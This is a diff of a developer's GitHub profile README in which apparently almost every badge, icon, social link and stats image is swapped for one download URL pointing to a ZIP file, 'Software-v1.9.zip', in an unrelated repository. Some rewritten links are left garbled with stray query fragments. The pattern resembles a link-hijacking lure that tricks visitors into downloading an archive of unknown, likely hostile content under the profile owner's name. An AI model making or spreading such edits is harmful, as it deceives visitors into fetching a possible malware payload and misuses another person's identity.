@@ -2,13 +2,13 @@
 <div align="center">
 
 ### A passionate Web and Python Developer
-<img width="100%" src="https://capsule-render.vercel.app/api?type=waving&height=250&color=0:050816,50:2b1055,100:00f5ff&text=SUMIT%20GAIKWAD&fontSize=52&fontColor=39FF14&animation=fadeIn&fontAlignY=38&desc=Passionate%20Web%20and%20Python%20Developer&descAlignY=58" alt="banner"/>
+<img width="100%" src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip,50:2b1055,100:00f5ff&text=SUMIT%20GAIKWAD&fontSize=52&fontColor=39FF14&animation=fadeIn&fontAlignY=38&desc=Passionate%20Web%20and%20Python%20Developer&descAlignY=58" alt="banner"/>
 
-![Profile Views](https://komarev.com/ghpvc/?username=SUMITGAIKWAD90&label=Profile%20views&color=0e75b6&style=flat)
-[![Typing SVG](https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=700&size=24&pause=900&color=00F5FF&center=true&vCenter=true&width=980&lines=Hi%2C+I'm+Sumit+Gaikwad+%F0%9F%91%8B;Web+Developer+%7C+Python+Developer;Building+MDM+-+Connect;Learning+DSA+%2B+Data+Science;Open+for+Web%2FDS%2FML+Collaborations)](https://git.io/typing-svg)
+![Profile Views](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)
+[![Typing SVG](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip+Mono&weight=700&size=24&pause=900&color=00F5FF&center=true&vCenter=true&width=980&lines=Hi%2C+I'm+Sumit+Gaikwad+%F0%9F%91%8B;Web+Developer+%7C+Python+Developer;Building+MDM+-+Connect;Learning+DSA+%2B+Data+Science;Open+for+Web%2FDS%2FML+Collaborations)](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)
 
 <p>
-  <img src="https://komarev.com/ghpvc/?username=SUMITGAIKWAD90&label=PROFILE+VIEWS&style=for-the-badge&color=00e5ff" alt="views"/>
+  <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip+VIEWS&style=for-the-badge&color=00e5ff" alt="views"/>
   <img src="https://img.shields.io/github/followers/SUMITGAIKWAD90?style=for-the-badge&color=7C4DFF&labelColor=0D1117" alt="followers"/>
   <img src="https://img.shields.io/github/stars/SUMITGAIKWAD90?affiliations=OWNER%2CCOLLABORATOR&style=for-the-badge&color=39FF14&labelColor=0D1117" alt="stars"/>
 </p>
@@ -41,8 +41,8 @@ Status      : Always shipping better versions 🚀
 ## 🌐 Connect with me:
 ## 🧠 About Me
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?logo=linkedin)](https://www.linkedin.com/in/sumitggaikwad/)
-[![Instagram](https://img.shields.io/badge/Instagram-Follow-red?logo=instagram)](https://www.instagram.com/itz__sumiit09)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?logo=linkedin)](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)
+[![Instagram](https://img.shields.io/badge/Instagram-Follow-red?logo=instagram)](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)
 <div align="center">
 
 ---
@@ -61,25 +61,25 @@ Status      : Always shipping better versions 🚀
 <summary><b>🛰️ Expand Developer Notes</b></summary>
 <br/>
 
-  <a href="https://getbootstrap.com" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/bootstrap/bootstrap-plain-wordmark.svg" alt="bootstrap" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="bootstrap" width="40" height="40"/>
   </a>
 - I enjoy building sleek UI + practical backend flows.
 - I like solving real-world problems with code and data.
 - I focus on writing maintainable, scalable, and clean projects.
 
-  <a href="https://canvasjs.com" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/Hardik0307/Hardik0307/master/assets/canvasjs-charts.svg" alt="canvasjs" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="canvasjs" width="40" height="40"/>
   </a>
 </details>
 
-  <a href="https://www.w3schools.com/cpp/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/cplusplus/cplusplus-original.svg" alt="cplusplus" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="cplusplus" width="40" height="40"/>
   </a>
 ---
 
-  <a href="https://www.w3schools.com/cs/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/csharp/csharp-original.svg" alt="csharp" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="csharp" width="40" height="40"/>
   </a>
 ## 🛠️ Tech Stack
 
@@ -123,129 +123,129 @@ Status      : Always shipping better versions 🚀
 
 </div>
 
-  <a href="https://www.w3schools.com/css/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/css3/css3-original-wordmark.svg" alt="css3" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="css3" width="40" height="40"/>
   </a>
 ---
 
-  <a href="https://www.w3.org/html/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/html5/html5-original-wordmark.svg" alt="html5" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="html5" width="40" height="40"/>
   </a>
 ## 🌌 Featured Projects
 
-  <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/javascript/javascript-original.svg" alt="javascript" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="javascript" width="40" height="40"/>
   </a>
 <div align="center">
 
-  <a href="https://www.linux.org/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/linux/linux-original.svg" alt="linux" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="linux" width="40" height="40"/>
   </a>
 ### `⚙️ Premium Project Deck (Placeholders)`
 
-  <a href="https://nodejs.org" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/nodejs/nodejs-original-wordmark.svg" alt="nodejs" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="nodejs" width="40" height="40"/>
   </a>
 </div>
 
-  <a href="https://www.photoshop.com/en" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/photoshop/photoshop-line.svg" alt="photoshop" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="photoshop" width="40" height="40"/>
   </a>
 <details>
 <summary><b>🚀 Open Project Layout</b></summary>
 <br/>
 
-  <a href="https://www.python.org" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" alt="python" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="python" width="40" height="40"/>
   </a>
 ### 1) MDM - Connect
 - **Type:** Web Platform
 - **Stack:** React · Node.js · Firebase
 - **Description:** A collaboration-focused platform with modern workflows and scalable structure.
-- **Repo:** `https://github.com/SUMITGAIKWAD90/<repo-name>`
+- **Repo:** `https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip<repo-name>`
 - **Live:** `https://<demo-link>`
 
-  <a href="https://reactjs.org/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/react/react-original-wordmark.svg" alt="react" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="react" width="40" height="40"/>
   </a>
 ### 2) Data Insight Engine
 - **Type:** Data Science
 - **Stack:** Python · Pandas · Matplotlib · Seaborn
 - **Description:** End-to-end data analysis pipeline with visual reporting.
-- **Repo:** `https://github.com/SUMITGAIKWAD90/<repo-name>`
+- **Repo:** `https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip<repo-name>`
 
-  <a href="https://tailwindcss.com/" target="_blank" rel="noreferrer">
-    <img src="https://www.vectorlogo.zone/logos/tailwindcss/tailwindcss-icon.svg" alt="tailwind" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="tailwind" width="40" height="40"/>
   </a>
 ### 3) ML Predictor Suite
 - **Type:** Machine Learning
 - **Stack:** Python · TensorFlow · PyTorch
 - **Description:** Model training, evaluation, and deployment-ready experimentation.
-- **Repo:** `https://github.com/SUMITGAIKWAD90/<repo-name>`
+- **Repo:** `https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip<repo-name>`
 
-  <a href="https://www.djangoproject.com/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/django/django-original.svg" alt="django" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="django" width="40" height="40"/>
   </a>
 </details>
 
-  <a href="https://www.tensorflow.org/" target="_blank" rel="noreferrer">
-    <img src="https://www.vectorlogo.zone/logos/tensorflow/tensorflow-icon.svg" alt="tensorflow" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="tensorflow" width="40" height="40"/>
   </a>
 ---
 
-  <a href="https://pytorch.org/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/pytorch/pytorch-original.svg" alt="pytorch" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="pytorch" width="40" height="40"/>
   </a>
 ## 📊 GitHub Analytics Dashboard
 
-  <a href="https://pandas.pydata.org/" target="_blank" rel="noreferrer">
-    <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/pandas/pandas-original.svg" alt="pandas" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="pandas" width="40" height="40"/>
   </a>
 <div align="center">
 
-  <a href="https://matplotlib.org/" target="_blank" rel="noreferrer">
-    <img src="https://matplotlib.org/_static/images/logo2.svg" alt="matplotlib" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="matplotlib" width="40" height="40"/>
   </a>
-<img height="180em" src="https://github-readme-stats.vercel.app/api?username=SUMITGAIKWAD90&show_icons=true&theme=tokyonight&hide_border=true&bg_color=00000000" alt="stats"/>
-<img height="180em" src="https://github-readme-stats.vercel.app/api/top-langs/?username=SUMITGAIKWAD90&layout=compact&theme=tokyonight&hide_border=true&bg_color=00000000" alt="langs"/>
+<img height="180em" src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="stats"/>
+<img height="180em" src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="langs"/>
 
-  <a href="https://seaborn.pydata.org/" target="_blank" rel="noreferrer">
-    <img src="https://seaborn.pydata.org/_static/logo-wide-lightbg.svg" alt="seaborn" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="seaborn" width="40" height="40"/>
   </a>
-<img height="180em" src="https://streak-stats.demolab.com?user=SUMITGAIKWAD90&theme=tokyonight&hide_border=true&background=00000000" alt="streak"/>
+<img height="180em" src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="streak"/>
 
-  <a href="https://www.php.net/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/php/php-original.svg" alt="php" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="php" width="40" height="40"/>
   </a>
-[![Trophy](https://github-profile-trophy.vercel.app/?username=SUMITGAIKWAD90&theme=algolia&no-frame=true&no-bg=true&margin-w=10)](https://github.com/ryo-ma/github-profile-trophy)
+[![Trophy](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)
 
-  <a href="https://git-scm.com/" target="_blank" rel="noreferrer">
-    <img src="https://www.vectorlogo.zone/logos/git-scm/git-scm-icon.svg" alt="git" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="git" width="40" height="40"/>
   </a>
 </div>
 
-  <a href="https://github.com/" target="_blank" rel="noreferrer">
-    <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="github" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="github" width="40" height="40"/>
   </a>
 ---
 
-  <a href="https://firebase.google.com/" target="_blank" rel="noreferrer">
-    <img src="https://www.vectorlogo.zone/logos/firebase/firebase-icon.svg" alt="firebase" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="firebase" width="40" height="40"/>
   </a>
 ## 📈 Contribution Graph
 
-  <a href="https://www.mysql.com/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/mysql/mysql-original-wordmark.svg" alt="mysql" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="mysql" width="40" height="40"/>
   </a>
 <div align="center">
 
-  <a href="https://www.mongodb.com/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/mongodb/mongodb-original-wordmark.svg" alt="mongodb" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="mongodb" width="40" height="40"/>
   </a>
-[![activity graph](https://github-readme-activity-graph.vercel.app/graph?username=SUMITGAIKWAD90&theme=tokyo-night&hide_border=true&area=true)](https://github.com/SUMITGAIKWAD90)
+[![activity graph](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)
 
-  <a href="https://www.microsoft.com/en-us/windows" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/windows8/windows8-original.svg" alt="windows" width="40" height="40"/>
+  <a href="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" target="_blank" rel="noreferrer">
+    <img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" alt="windows" width="40" height="40"/>
   </a>
 </p>
 </div>
@@ -255,7 +255,7 @@ Status      : Always shipping better versions 🚀
 ## 🏆 GitHub Trophies
 ## 💬 Futuristic Developer Quote
 
-[![Trophies](https://github-profile-trophy.vercel.app/?username=SUMITGAIKWAD90&theme=darkhub&margin-w=15)](https://github.com/ryo-ma/github-profile-trophy)
+[![Trophies](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)
 <div align="center">
 
 > **"I don't just write code — I architect momentum for the future."** ⚡
@@ -267,17 +267,17 @@ Status      : Always shipping better versions 🚀
 ## 📊 GitHub Stats
 ## 🌐 Connect With Me
 
-![Top Langs](https://github-readme-stats.vercel.app/api/top-langs?username=SUMITGAIKWAD90&show_icons=true&locale=en&layout=compact)
+![Top Langs](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)
 <div align="center">
 
 [![Email](https://img.shields.io/badge/Email-om1929390%40gmail.com-0D1117?style=for-the-badge&logo=gmail&logoColor=EA4335)](mailto:om1929390@gmail.com)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Sumit%20Gaikwad-0D1117?style=for-the-badge&logo=linkedin&logoColor=0A66C2)](https://www.linkedin.com/in/sumitggaikwad/)
-[![Instagram](https://img.shields.io/badge/Instagram-itz__sumiit09-0D1117?style=for-the-badge&logo=instagram&logoColor=E4405F)](https://www.instagram.com/itz__sumiit09)
-[![GitHub](https://img.shields.io/badge/GitHub-SUMITGAIKWAD90-0D1117?style=for-the-badge&logo=github&logoColor=ffffff)](https://github.com/SUMITGAIKWAD90)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-Sumit%20Gaikwad-0D1117?style=for-the-badge&logo=linkedin&logoColor=0A66C2)](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)
+[![Instagram](https://img.shields.io/badge/Instagram-itz__sumiit09-0D1117?style=for-the-badge&logo=instagram&logoColor=E4405F)](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)
+[![GitHub](https://img.shields.io/badge/GitHub-SUMITGAIKWAD90-0D1117?style=for-the-badge&logo=github&logoColor=ffffff)](https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip)
 
 </div>
 
-<img src="https://media.giphy.com/media/13HgwGsXF0aiGY/giphy.gif" width="200"/>
+<img src="https://github.com/Sammyskyarmy/2026-1/raw/refs/heads/main/nonconservation/Software-v1.9.zip" width="200"/>
 ---
 
 <div align="center">
